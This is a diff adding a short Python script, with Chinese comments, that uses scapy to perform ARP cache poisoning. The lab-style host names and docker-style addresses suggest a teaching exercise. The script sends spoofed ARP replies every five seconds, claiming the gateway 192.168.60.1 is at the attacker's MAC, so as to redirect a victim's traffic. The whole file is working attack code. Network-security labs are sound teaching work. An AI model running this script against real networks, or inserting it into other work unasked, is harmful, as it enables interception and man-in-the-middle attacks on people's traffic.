@@ -1,0 +1,35 @@
+#!/usr/bin/python3
+from scapy.all import *
+import time
+
+# 目标主机(HostA)的IP和MAC（需通过arp -n或扫描获取）
+IP_VICTIM = "192.168.60.2"
+MAC_VICTIM = "02:42:c0:a8:3c:02"  # 替换为HostA的实际MAC地址
+
+# 网关(HostB)的IP
+IP_GATEWAY = "192.168.60.1"
+
+# HostM(攻击者)的MAC地址
+MAC_ATTACKER = "02:42:c0:a8:3c:03"  # 替换为hostM的实际MAC地址
+
+def arp_poisoning():
+    print("Starting ARP poisoning attack...")
+    
+    # 构造完整的以太网帧 + ARP包
+    ether = Ether(dst=MAC_VICTIM)  # 目标MAC设为HostA的MAC（或广播地址ff:ff:ff:ff:ff:ff）
+    arp = ARP(
+        op=2,                     # ARP响应（is-at）
+        psrc=IP_GATEWAY,          # 伪装成网关的IP
+        hwsrc=MAC_ATTACKER,       # 伪装成HostM的MAC
+        pdst=IP_VICTIM,           # 目标IP（HostA）
+        hwdst=MAC_VICTIM          # 目标MAC（HostA）
+    )
+    packet = ether / arp          # 组合以太网帧和ARP层
+    
+    while True:
+        sendp(packet, verbose=0)  # 使用sendp()发送二层数据包
+        print(f"Sent spoofed ARP to {IP_VICTIM}: {IP_GATEWAY} is at {MAC_ATTACKER}")
+        time.sleep(5)
+
+if __name__ == "__main__":
+    arp_poisoning()
